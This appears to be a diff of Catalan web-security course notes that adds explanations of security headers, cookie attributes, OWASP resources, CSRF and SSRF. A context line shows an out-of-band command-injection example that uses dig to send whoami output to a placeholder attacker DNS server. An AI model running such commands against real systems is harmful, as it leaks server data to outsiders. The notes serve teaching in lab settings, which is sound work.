@@ -156,11 +156,20 @@
     </ol>
 
       <h2>Capçaleres de seguretat</h2>
+      <p>Les capçaleres de seguretat HTTP són un conjunt de peticio i resposta que envia el servidor web al navegador per a millorar la seguretat de les aplicacions web i reduir vulnerabilitats comunes.
+        Són headers HTTP que indiquen al navegador com ha de comportar-se davant possibles atacs.      </p>
+      <p>Les ferramentes d'anàlisi automatic de vulnerabilitats comprovenla presència o ausència d'estes capçaleres de seguretat, alertant si cal</p>
+
       <h3>Us segur de http cookies</h3>
-      <p>A més dels atributs Path i Domain, les cookies poden portar també uns atributs de seguretat</p>
+      <p>La primera línia de seguretat son els atributs atributs Path i Domain, que permeten restringir on s'enviaran les cookies. A més a més 
+        estan els atributs SameSite, Secure i HttpOnly
+      </p>
       <h4>SameSite</h4>
+      <p>Pot ser None, Lax i Strict. En tornar a visitar una mateixa pàgina, Establix si la cookie es torna a enviar o no, depenent d'on (origen) es busque la pàgina.</p>
       <h4>Secure</h4>
+      <p>Indica al client que la cookie sols s'enviarà a través de una comunicació segura (com https)</p>
       <h4>HttpOnly</h4>
+      <p>Evita que el client puga accedir a la cookie des de javascript.</p>
 
        <h3>http Access Control (CORS)</h3>
       <p>El CORS (Cross-Origin Resource Sharing) és un mecanisme de seguretat implementat als navegadors web que permet que un lloc web (el client) 
@@ -195,7 +204,9 @@
       <p>L'OWASP Top 10 és un informe de conscienciació estàndard de la indústria que detalla les 10 vulnerabilitats de 
         seguretat més crítiques per a les aplicacions web. Publicat per la fundació OWASP, serveix com a guia fonamental 
         per a desenvolupadors, professionals de la seguretat i organitzacions per a prioritzar els seus esforços en la 
-        identificació i mitigació dels riscos de seguretat més comuns i perillosos.</p>
+        identificació i mitigació dels riscos de seguretat més comuns i perillosos. Es pot trovar en 
+      <a href="https://owasp.org/Top10">owasp.org/Top10</a></p>
+        
 
       <ul>
         <li>No és una llista exhaustiva</li>
@@ -205,7 +216,8 @@
       <h4>OWASP Vulnerable Web Applications Directory (VWAD)</h4>
       <p>El OWASP Vulnerable Web Applications Directory (VWAD), o Directori d'Aplicacions Web Vulnerables d'OWASP, 
         és un directori complet d'aplicacions web i mòbils vulnerables conegudes. És un recurs molt valuós per a 
-        desenvolupadors, provadors de seguretat i <strong>estudiants</strong> que volen practicar les seues habilitats en un entorn segur i legal.</p>
+        desenvolupadors, provadors de seguretat i <strong>estudiants</strong> que volen practicar les seues habilitats en un entorn segur i legal.
+        Es pot trovar en <a href="https://owasp.org/www-project-vulnerable-web-applications-directory/">VWAD</a> </p>
        <p>Es poden usar per a aprendre, formar-se i provar tècniques de seguretat ofensiva i defensiva, en lloc d'intentar
          trobar vulnerabilitats en llocs web reals, cosa que és il·legal i poc ètica</p>
         
@@ -232,9 +244,8 @@
         <li>apt install juice-shop </li>
         <pre><code># juice-shop-start 
 # juice-shop-stop    </code></pre>
-        <p>En TyHackMe també estan les màquines</p>  
-        <p>En PentesterLab també</p>
-        <p>En Academia de Seguridad Web de PortSwigger  també</p>
+        <p>En TyHackMe també estan les màquines, i en PentesterLab també</p>  
+        
         <p>Abans d'explicar les diferents categories d'atacs, es necessari coneixer el funcionament d'alguna eina que funcione com a proxy-web.  <br>
         Estes ferramentes es situen en mig de les comunicacions entre el navegador del client i el servidor web i intercepten el trànsit (REQUEST / RESPONSE)
         per inspeccionar i modificar el contingut, i poder així fer els atacs.
@@ -249,6 +260,7 @@
         <p>A continuació, dos videos per introduir-se en estes ferramentes</p>
         <a href="https://www.youtube.com/watch?v=G3hpAeoZ4ek">Burp Suite</a>  i 
         <a href="https://www.youtube.com/watch?v=xkUybXsyQ24&t=353s">ZAP</a> 
+        <p>En Academia de Seguretat Web de PortSwigger, es pot entrenar l'eina Burp Suite</p>
         <!--  katana : https://github.com/projectdiscovery/katana 
           https://hackers-arise.com/web-app-hacking-katana-a-next-generation-crawling-and-spidering-framework/  -->
 
@@ -578,15 +590,6 @@ Treure el password caràcter a caràcter
         <p>BeEF facilita les tasques d'explotació d'una vulnerabilitat XSS. Es tracta d'un framework que permet llançar un gran numero d'atacs sobre un objectiu compromés.</p>
         <p>Repo de BeEF en <a href="https://github.com/beefproject/beef">Github</a></p>
 
-
-
-<!--                
-        <h2>Criss-Site Request Forgery CSRF</h2>
-        <h2>Server-Side Request Forgery SSRF</h2>
-        <h2>Server-Side Template Injection  SSTI</h2>
-        <h2>XML External Entity (XXE) Injection</h2>
--->
-
         <hr>   <h2>OS Command Injection</h2>
         <p>La injecció de comandes del sistema operatiu (OS Command Injection) és una vulnerabilitat de seguretat que 
           permet a un atacant executar comandes del sistema operatiu en un servidor a través d'una aplicació web. 
@@ -617,6 +620,70 @@ Treure el password caràcter a caràcter
           i despres usar LFI amb  10.0.10.50/dvwa/hackable/uploads/usuarios.txt
           <li>tècniques Out-of-Band</li>
         dig @IP_DNS_ATACANT 'whoami'.dominio.com &
+
+        <hr><h2>Cross-Site Request Forgery CSRF</h2>
+        <p>CSRF és una vulnerabilitat de seguretat web que permet a un atacant fer que un usuari <strong>autenticat</strong> execute accions sense voler-ho en una aplicació web</p>
+        <p>El problema clau és que el servidor confia en el navegador de l’usuari perquè ja té la sessió oberta (cookies, token de sessió, etc.)</p>
+        <h4>Com detectar-la?</h4>
+        <p>Estiguent connectats a una webApp, Si s'intercepta una petició amb BurpSuit, per exemple, 
+          i es pot canviar de POST a GET , i funciona -> La vulnerabilitat està activa.</p>
+
+        <h4>Com funciona?</h4>
+          <ol>
+            <li>L’usuari inicia sessió en un web legítim (per exemple, el seu banc).</li>
+            <li>El navegador guarda una cookie de sessió.</li>
+            <li>Sense tancar sessió, l’usuari visita una web maliciosa.</li>
+            <li>Aquesta web envia una petició (GET o POST) cap al web legítim.</li>
+            <li>El navegador adjunta automàticament la cookie de sessió.</li>
+            <li>El servidor rep la petició i pensa:</li>
+            “Això ho ha demanat l’usuari autenticat” , ❌ però en realitat no és cert.
+          </ol>
+          <p>També es pot enviar el link maliciós, dins d'uns missatge de la aplicació web (si ho permet)..</p>
+
+          <ul> Un atac CSRF pot:
+            <li>Canviar contrasenyes</li>
+            <li>Fer transferències de diners</li>
+            <li>Esborrar comptes</li>
+            <li>Modificar dades personals</li>
+            <li>i més...</li>
+          </ul>
+
+        <hr><h2>Server-Side Request Forgery SSRF</h2>
+        <p>SSRF és una vulnerabilitat que permet a un atacant fer que el servidor faci peticions HTTP (o altres protocols) cap a 
+          destinacions que l’atacant escull, aprofitant que el servidor té més privilegis o accés intern que l’usuari.
+        👉 L’atacant no fa la petició directament, sinó que obliga el servidor a fer-la.</p>          
+        <h4>Com detectar-la?</h4>
+        <p>Estiguent connectats a una webApp, busquem funcionalitats on el servidor faci peticions (url, link , image, avatar, callback,
+          webhook, redirect, next, feed, import, pdf_url,... ). <br>
+        Introduim una URL controlada : http://exemple.com/test  <br>
+        Observar en BurpSuit..  <br>
+        ✔️ Si reps una petició → el backend fa requests</p>
+
+        <h4>  Per què és perillós? </h4>
+        <ul>  El servidor pot:
+          <li>Accedir a xarxes internes</li>
+          <li>Llegir metadades del núvol</li>
+          <li>Saltar firewalls</li>
+          <li>Accedir a serveis que no són públics</li>
+        </ul>
+
+        <h4>Tipus d’SSRF</h4>
+         <ol>
+          <li>SSRF bàsic</li>
+          El servidor retorna la resposta al client.
+          <li>Blind SSRF</li>
+          No es veu la resposta.
+          <ul>L’atacant detecta l’atac per:
+            <li>temps de resposta</li>
+            <li>logs</li>
+            <li>DNS callbacks  </li>
+          </ul>
+         </ol>
+
+<!--                
+        <h2>Server-Side Template Injection  SSTI</h2>
+        <h2>XML External Entity (XXE) Injection</h2>
+-->        
 
     
       </section>         
